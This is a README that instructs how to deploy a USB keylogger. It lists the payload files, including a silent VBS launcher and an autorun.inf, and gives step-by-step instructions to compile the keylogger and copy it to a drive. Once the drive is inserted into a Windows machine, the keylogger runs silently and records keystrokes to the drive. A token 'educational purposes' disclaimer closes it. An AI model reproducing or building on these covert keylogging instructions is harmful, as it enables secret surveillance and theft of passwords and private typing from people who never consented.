🚀 USB KEYLOGGER - DEPLOYMENT INSTRUCTIONS

This USB drive contains an autorun keylogger that starts automatically when inserted.

📁 FILES ON USB:
- keylogger.exe: Main executable (must be compiled from keylloger.py)
- autorun.inf: Windows autorun configuration
- stealth_autorun.vbs: Silent VBS launcher
- usb_autorun.bat: Batch file launcher
- README.txt: This instruction file

🔧 HOW TO SETUP:

1. COMPILE THE KEYLOGGER:
   python keylloger.py --create-exe
   
2. COPY FILES TO USB:
   - Copy keylogger.exe to USB root
   - Copy autorun.inf to USB root
   - Copy stealth_autorun.vbs to USB root (optional)
   - Copy usb_autorun.bat to USB root (optional)

3. INSERT USB:
   - Insert USB into Windows computer
   - Autorun will trigger automatically
   - Keylogger starts silently in background
   - Logs saved as keylog_output.txt on USB

⚠️ IMPORTANT NOTES:
- Only works on Windows with autorun enabled
- Some antivirus may block execution
- Use responsibly and legally
- Only test on systems you own

🔒 DISCLAIMER:
Educational and authorized testing purposes only.
User responsible for legal compliance. 